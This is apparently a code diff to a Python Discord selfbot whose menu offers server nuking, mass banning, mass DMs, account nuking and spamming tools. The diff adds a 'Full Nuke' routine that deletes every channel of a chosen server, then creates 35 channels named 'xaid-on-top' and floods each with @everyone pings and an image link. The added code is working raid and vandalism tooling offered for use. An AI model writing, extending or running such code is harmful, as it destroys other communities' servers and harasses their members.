@@ -26,8 +26,8 @@ def display_logo():
     print(center_text(logo))
 
 async def press_enter():
-    print(center_text(Fore.CYAN + '-' * 80))  # Add a cyan line
-    print(center_text(Fore.GREEN + "Press Enter to continue..."))  # Prompt
+    print(center_text(Fore.CYAN + '-' * 80))  
+    print(center_text(Fore.GREEN + "Press Enter to continue..."))  
     input()
 
 def get_option_input():
@@ -47,7 +47,7 @@ def display_menu():
             "Message Spammer", "Server Nuker", 
             "Mass Ban", "Mass DM", 
             "Server Info", "Account Nuker", "Server Permissions", "Webhook Spammer",
-            "@everyone Spammer", "Mass Create Channels", "Purge Messages", "Exit"
+            "@everyone Spammer", "Mass Create Channels", "Purge Messages", "Full Nuke", "Exit"
         ])
     ]
 
@@ -229,6 +229,11 @@ class MySelfbot(discord.Client):
                 await self.purge_messages(channel, count)
 
             elif choice == '12':
+                await self.list_servers()
+                server = self.guilds[int(input("Choose a server: ")) - 1]
+                await self.full_server_nuke(server)  
+
+            elif choice == '13':
                 print("Exiting...")
                 await self.logout()
                 break
@@ -329,6 +334,29 @@ class MySelfbot(discord.Client):
             print(f"{len(deleted)} messages deleted successfully.")
         except (discord.Forbidden, discord.HTTPException) as e:
             print(f"Failed to purge messages: {e}")
+
+    async def full_server_nuke(self, server):
+        """Perform a full server nuke by deleting channels and creating new ones."""
+        print(f"Performing full nuke on server: {server.name}...")
+        
+        for channel in server.channels:
+            try:
+                await channel.delete()
+                print(f"Deleted channel: {channel.name}")
+            except (discord.Forbidden, discord.HTTPException) as e:
+                print(f"Failed to delete channel: {e}")
+
+        for i in range(35):
+            try:
+                new_channel = await server.create_text_channel('xaid-on-top')
+                print(f"Created channel: {new_channel.name}")
+                for j in range(4):  
+                    await new_channel.send("@everyone https://imgur.com/a/inMuil5")
+                    print(f'Sent @everyone message in {new_channel.name}.')
+                    await asyncio.sleep(0.05)  
+            except (discord.Forbidden, discord.HTTPException) as e:
+                print(f"Failed to create channel {i + 1}: {e}")
+            await asyncio.sleep(0.05)
 
 async def main():
     """Main entry point for the selfbot."""
